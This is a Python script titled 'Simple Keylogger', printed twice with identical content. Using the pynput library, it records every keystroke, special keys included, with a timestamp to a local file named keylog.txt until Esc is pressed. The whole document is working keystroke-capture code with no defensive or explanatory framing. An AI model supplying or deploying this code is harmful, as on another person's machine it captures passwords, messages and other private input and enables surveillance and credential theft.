# Simple Keylogger

import logging
from pynput import keyboard

# Set up logging to record keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener when 'Esc' is pressed
        return False

# Start the listener to monitor keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
  
# Simple Keylogger

import logging
from pynput import keyboard

# Set up logging to record keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener when 'Esc' is pressed
        return False

# Start the listener to monitor keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
